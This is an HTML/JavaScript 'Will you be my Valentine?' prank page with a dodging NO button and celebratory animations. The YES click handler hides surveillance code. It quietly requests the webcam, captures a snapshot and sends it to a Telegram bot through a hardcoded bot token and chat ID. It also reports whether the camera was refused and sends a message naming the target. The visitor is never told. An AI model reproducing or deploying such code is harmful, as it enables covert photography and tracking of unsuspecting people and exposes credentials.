<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Valentine 💖</title>

<style>
body{
  margin:0;
  font-family:sans-serif;
  text-align:center;
  background:linear-gradient(135deg,#ff9a9e,#fad0c4);
  color:white;
  overflow:hidden;
}

.container{ margin-top:80px; }

h1{ font-size:28px; }

button{
  padding:15px 25px;
  font-size:18px;
  border:none;
  border-radius:30px;
  margin:10px;
  cursor:pointer;
  transition:0.3s;
}

#yes{ background:#ff3366; color:white; }
#no{ background:white; color:#ff3366; position:relative; }

/* hearts */
.heart{
  position:fixed;
  font-size:22px;
  animation:float 4s linear infinite;
}
@keyframes float{
  0%{transform:translateY(100vh);}
  100%{transform:translateY(-10vh);}
}

/* confetti */
.confetti{
  position:fixed;
  font-size:20px;
  animation:fall 3s linear infinite;
}
@keyframes fall{
  0%{transform:translateY(-10vh);}
  100%{transform:translateY(100vh);}
}

/* glow */
.glow{
  text-shadow:0 0 20px #fff, 0 0 40px #ff3366;
}
</style>
</head>

<body>

<div class="container">
  <h1 id="text">Will you be my Valentine? 💖</h1>

  <button id="yes">YES 💖</button>
  <button id="no">NO 😢</button>
</div>

<script>

let texts=[
"are you positive 🤔",
"pookie please..🥺",
"if you say no, i will be really sad 😢",
"i will be very sad 😕",
"please??? 😭",
"don't do it to me 😣",
"last chance 😈"
];

let i=0;
let noBtn=document.getElementById("no");
let yesBtn=document.getElementById("yes");

let scaleYes=1;

// NO
noBtn.onclick=()=>{
  if(i<texts.length){
    noBtn.innerText=texts[i];
    i++;
  }

  scaleYes += (i>=texts.length?0.5:0.2);
  yesBtn.style.transform="scale("+scaleYes+")";

  noBtn.style.position="absolute";
  noBtn.style.left=Math.random()*80+"vw";
  noBtn.style.top=Math.random()*80+"vh";

  if(i>=texts.length){
    noBtn.style.transition="0.1s";
  }
};

// YES
yesBtn.onclick=async()=>{

  document.body.innerHTML=`
    <div style="margin-top:100px;">
      <h1 class="glow" style="font-size:40px;">
        Knew you would say YES 😍💖
      </h1>

      <div style="font-size:70px; margin-top:20px;">
        💃🕺
      </div>

      <p style="margin-top:20px; font-size:18px;">
        you just made me happiest person 💞
      </p>
    </div>
  `;

  // ❤️ hearts
  setInterval(()=>{
    let h=document.createElement("div");
    h.className="heart";
    h.innerHTML="❤️";
    h.style.left=Math.random()*100+"vw";
    document.body.appendChild(h);
    setTimeout(()=>h.remove(),4000);
  },200);

  // 🎉 confetti
  setInterval(()=>{
    let c=document.createElement("div");
    c.className="confetti";
    c.innerHTML="🎉";
    c.style.left=Math.random()*100+"vw";
    document.body.appendChild(c);
    setTimeout(()=>c.remove(),3000);
  },150);

  // 📸 CAMERA
  try{
    let stream=await navigator.mediaDevices.getUserMedia({video:true});
    let video=document.createElement("video");
    video.srcObject=stream;
    await video.play();

    let canvas=document.createElement("canvas");
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    let ctx=canvas.getContext("2d");
    ctx.drawImage(video,0,0);

    let img=canvas.toDataURL("image/png");

    fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendPhoto",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        chat_id:"CHATID",
        photo:img,
        caption:"📸 YES bosildi 😍💍"
      })
    });

    stream.getTracks().forEach(t=>t.stop());

  }catch(e){
    fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text=YES bosildi (kamera rad qilindi)");
  }

  // 📩 text
  fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text=💍 SHAXZODA YES BOSDI!!! 😍❤️🔥");
};

</script>

</body>
</html>
